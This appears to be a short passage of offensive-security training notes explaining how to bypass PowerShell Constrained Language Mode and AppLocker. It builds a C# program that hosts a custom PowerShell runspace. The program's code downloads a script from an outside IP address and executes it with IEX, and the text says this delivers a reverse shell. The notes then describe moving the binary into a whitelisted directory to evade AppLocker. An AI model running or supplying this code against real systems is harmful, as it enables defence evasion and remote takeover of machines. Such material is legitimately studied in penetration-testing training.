## Custom Runspace Bypass
PowerShell.exe is essentially a GUI application handling input and output. The real functionality lies inside the System.Management.Automation.dll managed DLL, which PowerShell.exe calls to create a _runspace_.

We could code a C# application that creates a custom PowerShell runspace and executes our script inside it.

For this, we'll create a new Visual Studio console app project with the following code:
```Csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CustomRunspace
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.135/run.ps1') | IEX Out-File -FilePath C:\\Tools\\test.txt"; 
			ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}

```

Visual Studio can not locate _System.Management.Automation.Runspaces_, to resolve this, we must manually add the assembly reference from 
```cmd
C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35
```
folder where we will select System.Management.Automation.dll.

In the code above, we are using powershell to download and execute a powershell reverse shell.
AppLocker blocks our C# executable because we executed it from a non-whitelisted directory. So, we copy the executable into a whitelisted directory to verify our constrained language mode bypass to get the result
